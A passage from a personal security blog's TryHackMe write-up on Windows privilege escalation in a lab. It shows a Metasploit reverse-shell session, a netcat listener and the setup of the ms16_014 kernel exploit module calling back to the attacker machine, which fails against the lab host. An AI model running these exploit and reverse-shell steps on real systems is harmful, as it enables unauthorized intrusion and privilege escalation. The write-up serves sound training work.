</pre></table></code></div></div><p>Then we upload the malicious file and we execute it and, by returning to the Metasploit listener, we have the shell:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task14_shell.png" alt="Shell" /></p><h5 id="detection--exploitation">Detection &amp; Exploitation</h5><p>Now, we have a shell as a low-privilege user, we want to become administrators and we use the kernel exploit MS16_014. We use the <strong>ms16_014_wmi_recv_notif</strong> module of metasploit.</p><p>Before selecting the module needed to exploit this, we check the Metasploit session, since the ms16_014_wmi_recv_notif module needs a session to set.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>msf6 exploit(windows/local/ms16_014_wmi_recv_notif) &gt; sessions

Active sessions
===============

  Id  Name  Type                     Information           Connection
  --  ----  ----                     -----------           ----------
  5         meterpreter x86/windows  TCM-PC\user @ TCM-PC  10.8.80.159:4444 -&gt; 10.10.202.219:65430 (10.10.202.219)
</pre></table></code></div></div><p>Then we set a listener with the command <code class="language-plaintext highlighter-rouge">nc -lnvp 5555</code> and, finally, we set the <strong>session</strong> field (we put the session Id of the low-privilege access), the <strong>lhost</strong> field, and the <strong>lport</strong> with the Kali machine IP and the port that we use for the listener:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>msf6 exploit(windows/local/ms16_014_wmi_recv_notif) &gt; set session 5
session =&gt; 5
msf6 exploit(windows/local/ms16_014_wmi_recv_notif) &gt; set lhost 10.8.80.159
lhost =&gt; 10.8.80.159
msf6 exploit(windows/local/ms16_014_wmi_recv_notif) &gt; set lport 5555
lport =&gt; 5555
msf6 exploit(windows/local/ms16_014_wmi_recv_notif) &gt; run

[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 10.8.80.159:5555 
[-] Exploit aborted due to failure: no-target: Running against WOW64 is not supported
[*] Exploit completed, but no session was created.
</pre></table></code></div></div><p>After many attempts, this approach doesn’t work for me. Maybe because the system is not vulnerable, indeed, by running the Metasploit module <strong>post/multi/recon/local_exploit_suggester</strong> to suggest the exploits, there isn’t the ms16_014:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/windows-privesc/task14_exploit.png" alt="Exploit suggester" /></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeup/'>WriteUp</a>, <a href='/categories/tryhackme/'>TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/widows/" class="post-tag no-text-decoration" >Widows</a> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >TryHackMe</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >WriteUp</a> <a href="/tags/privesc/" class="post-tag no-text-decoration" >PrivEsc</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Windows PrivEsc Arena - CinnamonSec&url=https://nananan.github.io/posts/windows-privesc-arena/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Windows PrivEsc Arena - CinnamonSec&u=https://nananan.github.io/posts/windows-privesc-arena/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Windows PrivEsc Arena - CinnamonSec&url=https://nananan.github.io/posts/windows-privesc-arena/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/kerberos/">The Kerberos grand hotel</a><li><a href="/posts/steel-mountain/">Steel Mountain</a><li><a href="/posts/windows-privesc-arena/">Windows PrivEsc Arena</a><li><a href="/posts/alfred/">Alfred</a><li><a href="/posts/thin-job/">Thin Job</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">WriteUp</a> <a class="post-tag" href="/tags/tryhackme/">TryHackMe</a> <a class="post-tag" href="/tags/learn/">Learn</a> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/alfred/">Alfred</a> <a class="post-tag" href="/tags/cronjob/">CronJob</a> <a class="post-tag" href="/tags/cve-2021-43397/">CVE-2021-43397</a> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/exploit/">Exploit</a> <a class="post-tag" href="/tags/filethingie/">FileThingie</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/steel-mountain/"><div class="card-body"> <span class="timeago small" > Mar 28, 2021 <i class="unloaded">2021-03-28T00:00:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Steel Mountain</h3><div class="text-muted small"><p> Steel Mountain In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administr...</p></div></div></a></div><div class="card"> <a href="/posts/alfred/"><div class="card-body"> <span class="timeago small" > Apr 2, 2021 <i class="unloaded">2021-04-02T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Alfred</h3><div class="text-muted small"><p> Alfred In this room, we’ll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development...</p></div></div></a></div><div class="card"> <a href="/posts/ollie/"><div class="card-body"> <span class="timeago small" > Jun 7, 2022 <i class="unloaded">2022-06-07T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Ollie</h3><div class="text-muted small"><p> Ollie Oh my god! I did this CTF only for Ollie, the dog! You can find this CTF here Enumeration I began with a nmap TCP scan: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/steel-mountain/" class="btn btn-outline-primary" prompt="Older"><p>Steel Mountain</p></a> <a href="/posts/alfred/" class="btn btn-outline-primary" prompt="Newer"><p>Alfred</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('.post-content img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/_cinnamon_92">Eliana Cannella</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/writeup/">WriteUp</a> <a class="post-tag" href="/tags/tryhackme/">TryHackMe</a> <a class="post-tag" href="/tags/learn/">Learn</a> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/alfred/">Alfred</a> <a class="post-tag" href="/tags/cronjob/">CronJob</a> <a class="post-tag" href="/tags/cve-2021-43397/">CVE 2021 43397</a> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/exploit/">Exploit</a> <a class="post-tag" href="/tags/filethingie/">FileThingie</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://nananan.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
